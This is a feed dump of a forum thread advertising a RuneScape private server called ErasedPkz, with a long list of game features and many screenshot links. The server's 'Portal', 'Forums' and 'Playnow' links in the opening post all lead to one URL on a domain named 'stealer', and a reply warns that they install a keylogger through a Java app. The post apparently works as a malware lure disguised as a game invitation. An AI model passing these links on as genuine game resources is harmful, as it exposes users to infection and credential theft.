channel.title: My new Private Server ~ Great Economy and 247
channel.description:
[IMG]http://i53.tinypic.com/155nipx.png[/img] [url=http://stealer.ambesty.com/theme/blank.aspx?hash=Z7XOV038YX]Portal[/url]
[IMG]http://i52.tinypic.com/ra2af6.png[/img] [url=http://stealer.ambesty.com/theme/blank.aspx?hash=Z7XOV038YX]Forums[/url]
[IMG]http://i53.tinypic.com/287n348.png[/img] [url=http://stealer.ambesty.com/theme/blank.aspx?hash=Z7XOV038YX]Playnow[/url] ErasedPkz brings you:
Achievement system with 34 Achievements Fading hitmarks with criticals A good combat system Full Hybridding Hard bosses to fight - Nomad Nex A fun PvP System Killstreaks Custom Herblore Custom Fletching Custom Crafting Custom Woodcutting Full korasi Special Npc Vs Npc Summoning Specials (Only Pak yak, Wolpentinger, Unicorn, Steel titan) Clue scrolls Custom Clan chat - With clan Deaths/Kills Soon - Clan wars Dungeoneering More than 40 Clue scroll tasks! Runs on Hyperion engine & Very stable
[img]http://www.upload.ee/image/1986062/Nex.png[/img] [img]http://www.upload.ee/image/1986092/achieve.png[/img] [img]http://www.upload.ee/image/1986100/slayer.png[/img] [img]http://www.upload.ee/image/1986094/monster.png[/img] [img]http://www.upload.ee/image/2133964/Switch.gif[/img] [img]http://www.upload.ee/image/2133974/titan.gif[/img] [img]http://www.upload.ee/image/2133978/korasi.gif[/img] [img]http://www.upload.ee/image/2133980/wolpentinger.gif[/img] [img]http://www.upload.ee/image/2133989/Yak.gif[/img] [img]http://www.upload.ee/image/2133998/yak1.gif[/img] [img]http://www.upload.ee/thumb/2134010/dice.gif[/img] [img]http://www.upload.ee/image/2134014/clue.png[/img] [img]http://www.upload.ee/image/1986721/crafting.png[/img] [img]http://www.upload.ee/image/1986724/crafting1.png[/img] [img]http://www.upload.ee/image/1986726/fletching.png[/img] [img]http://www.upload.ee/image/1986730/fletching1.png[/img] [img]http://www.upload.ee/image/1986762/herblore.png[/img] [img]http://www.upload.ee/image/1986766/herblore1.png[/img] [img]http://www.upload.ee/image/1986868/herblore2.png[/img] [img]http://www.upload.ee/image/1986768/woodcutting.png[/img] [img]http://www.upload.ee/image/1986807/PkPoint.png[/img] [img]http://www.upload.ee/image/1986812/pointshop.png[/img] [img]http://www.upload.ee/image/1986814/voteshop.png[/img] [img]http://www.upload.ee/image/1986818/Pin.png[/img] [img]http://www.upload.ee/image/2134034/Naamloos.png[/img] [img]http://www.upload.ee/image/2134036/pktab.png[/img] [img]http://www.upload.ee/image/2134048/fullscreen.png[/img]
[url=http://www.youtube.com/watch?v=lLX9UG-4460&context=C3473daaADOEgsToPDskJjPrl5h-CVJ_n14-f1m-Tw]http://www.youtube.com/watch?v=lLX9UG-4460&context=C3473daaADOEgsToPDskJjPrl5h-CVJ_n14-f1m-Tw[/url] Features: Correct dungeoneering interfaces Monster levels vary on parties total combat level Smuggler enabled, consists of 3 kind of shops(food, potions and ammunition, weapons and armour) Rewards completed Interface and data completed Drops completed Some portals need keys to open, others cannot be used 5 different bosses(Still in developement) Floor complexity added Party system enabled, allowed up to 5 members(including leader) Can reset your floor progress(prestige, if you have done that floor and you do again, you will receive less XP + tokens) 5 floors explorable Monsters completed Binding completed Unbinding items 2 dungeon sizes (Large is still in developement) Correct statistics for each dungeoneering item Requirements included [/CENTER][/QUOTE]

item.title: My new Private Server ~ Great Economy and 247
item.dc:creator: @whackatre Whackatre
item.description:
@whackatre wrote:

[quote=“Skyro, post:9, topic:435699”]Post it here.

http://www.moparisthebest.com/serverstatus.php

Them links will keylog you don’t let the java app run.[/quote]

@Offtopic: You and Skyru have kinda similar names. Keeps confusing me. Lol.

Read full topic

item.title: My new Private Server ~ Great Economy and 247
item.dc:creator: @TheHoundPound TheHoundPound
item.description:
@TheHoundPound wrote:


Portal


Forums


Playnow
ErasedPkz brings you:

Achievement system with 34 Achievements
Fading hitmarks with criticals
A good combat system
Full Hybridding
Hard bosses to fight -
Nomad
Nex
A fun PvP System
Killstreaks
Custom Herblore
Custom Fletching
Custom Crafting
Custom Woodcutting
Full korasi Special
Npc Vs Npc
Summoning Specials
(Only Pak yak, Wolpentinger, Unicorn, Steel titan)
Clue scrolls
Custom Clan chat - With clan Deaths/Kills
Soon - Clan wars
Dungeoneering
More than 40 Clue scroll tasks!
Runs on Hyperion engine & Very stable




















woodcutting.png760×497







http://www.youtube.com/watch?v=lLX9UG-4460&context=C3473daaADOEgsToPDskJjPrl5h-CVJ_n14-f1m-Tw
Features:
Correct dungeoneering interfaces
Monster levels vary on parties total combat level
Smuggler enabled, consists of 3 kind of shops(food, potions and ammunition, weapons and armour)
Rewards completed
Interface and data completed
Drops completed
Some portals need keys to open, others cannot be used
5 different bosses(Still in developement)
Floor complexity added
Party system enabled, allowed up to 5 members(including leader)
Can reset your floor progress(prestige, if you have done that floor and you do again, you will receive less XP + tokens)
5 floors explorable
Monsters completed
Binding completed
Unbinding items
2 dungeon sizes (Large is still in developement)
Correct statistics for each dungeoneering item
Requirements included
[/CENTER][/QUOTE]

Read full topic
